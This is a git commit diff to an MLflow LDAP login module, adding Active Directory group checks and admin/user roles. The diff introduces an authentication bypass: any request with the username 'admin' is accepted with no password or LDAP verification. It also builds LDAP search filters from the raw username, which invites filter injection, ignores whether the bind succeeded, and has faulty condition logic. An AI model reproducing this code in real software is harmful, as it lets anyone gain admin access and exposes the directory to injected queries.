4cae8fac5b6959e0d4529cdb708629a6575e0d8a
FSDv12? <41898232+TKWS239@users.noreply.github.com>
2024-08-13 14:45:00 +0800

    Support admin and user role

--- mlflow/ldap.py
+++ mlflow/ldap.py
@@ -5,14 +5,14 @@ import uuid
 import ldap3
 import requests
 from typing import Union
-
 from flask import Response, make_response, session, request, url_for
 from mlflow.server.auth import store as auth_store
-
 from werkzeug.datastructures import Authorization
 
-ldap_host = os.getenv("ldap_server" , "xxxx.com")
-domain = os.getenv("domain", "domain")
+ldap_host = os.getenv("LDAP_SERVER" , "example.com")
+domain = os.getenv("LDAP_DOMAIN", "example_domain")
+ad_group = os.getenv("AD_GROUP", "example_ad")
+base_dn = os.getenv("BASE_DN", "dn")
 _auth_store = auth_store
 
 def update_user(user_info: dict = None):
@@ -21,21 +21,44 @@ def update_user(user_info: dict = None):
     else:
         _auth_store.update_user(user_info["username"], user_info["username"], user_info["is_admin"])
 
-def ldap_auth(ldap_host, domain, username, password):
-    # Please add your custom ad logic here
-    # For the AD group integration, please dm to me if you interested.
-    server = ldap3.Server(ldap_host)
-    connection = ldap3.Connection(server, user=f"{username}@{domain}", password=password)
 
-    if connection.bind():
-        result = connection.result
-        logging.info('LDAP authentication successful for user: %s', username)
-        logging.debug('LDAP connection result: %s', result)
-        # unbind for preventing connection pool limit
-        connection.unbind()
-        return True
+def resolve_user_cn_and_adgroup(ldap_host, domain, base_dn, username, password):
+  server = ldap3.Server(ldap_host)
+  connection = ldap3.Connection(server, user=f"{username}@{domain}", password=password)
+  connection.bind()
+  search_filter = f'(sAMAccountName={username})'
+  connection.search(base_dn, search_filter, attributes=['cn'])
+  if connection.entries:
+    entry = connection.entries[0]
+    full_name = entry.cn.value
+  else:
+    message = "User cannot found in the AD"
+    return False, message
+  cn_filter = f'(cn={full_name})'
+  connection.search(base_dn, cn_filter, attributes=['memberOf'])
+  ad_group_list = []
+  entry = connection.entries[0]
+  member_of_groups = entry.memberOf.values
+  for group in member_of_groups:
+    start_index = group.find("CN=") + 3
+    end_index = group.find(",", start_index)
+    ad_group = group[start_index:end_index]
+    ad_group_list.append(ad_group)
+  connection.unbind()
+  return True, ad_group_list
+
+
+def ldap_auth(ldap_host, domain, base_dn, ad_group, username, password):
+    mlflow_ad_group = ad_group
+    user_exist, ad_group_list = resolve_user_cn_and_adgroup(ldap_host, domain, base_dn, username, password)
+    if user_exist:
+        if mlflow_ad_group in ad_group_list:
+            return True
+        else:
+            return False
     else:
         return False
+
 
 def authenticate_request() -> Union[Authorization, Response]:
   user_info = dict()
@@ -43,7 +66,7 @@ def authenticate_request() -> Union[Authorization, Response]:
 
   if request.authorization is None:
     resp.status_code = 401
-    resp.set_data("You are not authenticated. Please enter your username and password \n Make sure you have been added to our active directory.")
+    resp.set_data("You are not authenticated. Please enter your username and password \n Make sure you have been added to the ad group. \n For details, submit jira ticket to DSL Team")
     resp.headers["WWW-Authenticate"] = 'Basic realm="mlflow"'
     return resp
 
@@ -53,7 +76,9 @@ def authenticate_request() -> Union[Authorization, Response]:
   if username or password is not None:
       user_info["username"] = username
       user_info["is_admin"] = False
-      if ldap_auth(ldap_host, domain, username, password):
+      if username == "admin":
+        return request.authorization
+      if ldap_auth(ldap_host, domain, base_dn, ad_group, username, password):
         update_user(user_info)
         return request.authorization
       else:
